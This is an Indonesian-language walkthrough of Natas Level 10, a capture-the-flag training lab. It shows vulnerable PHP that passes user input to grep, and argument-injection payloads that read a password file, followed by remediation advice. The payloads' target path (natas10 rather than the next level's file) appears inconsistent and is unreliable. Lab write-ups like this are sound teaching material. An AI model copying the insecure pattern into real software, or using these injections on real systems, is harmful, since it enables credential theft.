---
title: "Level 10"
description: Melewati filter input dengan mengeksploitasi perilaku multi-file grep.
sidebarTitle: "Level 10 — Bypass Filter Input"
---

## Profil

- **Target:** `http://natas10.natas.labs.overthewire.org`
- **Kredensial:** `natas10` / (*password* dari Level 9)

## Pengintaian

Kode sumber mirip dengan Level 9, namun dengan tambahan filter masukan:

```php
$key = $_REQUEST["needle"];

if($key != "") {
    if(preg_match('/[;|&]/', $key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
```

Metakarakter *shell* (`;`, `|`, `&`) diblokir oleh filter *regex*. Pendekatan injeksi perintah dari Level 9 tidak lagi berfungsi.

## Analisis

Meskipun metakarakter *shell* telah difilter, perintah `grep` masih menerima masukan yang tidak tersanitasi. `grep` menerima sebuah pola dan satu atau lebih jalur berkas:

```bash
grep [options] pattern [file...]
```

Apabila masukan mengandung pola yang cocok dengan seluruh baris dan jalur berkas tambahan disertakan, `grep` akan mencari berkas-berkas tersebut. Baris yang cocok akan dicetak pada keluaran, sehingga secara efektif membocorkan isi berkas.

Muatan harus memenuhi dua kondisi:

1. Pola harus cocok dengan baris di `dictionary.txt` (untuk menghindari keluaran kosong)
2. Jalur berkas tambahan harus disertakan untuk mengarah pada berkas *password* target

## Eksploitasi

Dikarenakan `#` mengomentari sisa perintah dalam bash, muatan seperti:

```
.* /etc/natas_webpass/natas10 #
```

Menghasilkan perintah efektif:

```bash
grep -i .* /etc/natas_webpass/natas10 # dictionary.txt
```

Pola `.*` cocok dengan seluruh baris. `grep` mencari `/etc/natas_webpass/natas10` dan `dictionary.txt`, namun semua yang ada setelah `#` diperlakukan sebagai komentar oleh *shell*.

Muatan alternatif yang juga berfungsi:

- `"" /etc/natas_webpass/natas10 /` — pola kosong cocok dengan semua
- `.* /etc/natas_webpass/natas10` — jalur berkas eksplisit

## Remediasi

- Gunakan `escapeshellarg()` untuk memperlakukan masukan pengguna sebagai argumen tunggal, bukan membiarkannya menyisipkan argumen tambahan
- Hindari fungsi eksekusi *shell* sepenuhnya apabila memungkinkan
- Terapkan daftar putih (*whitelist*) yang ketat untuk pola yang diizinkan
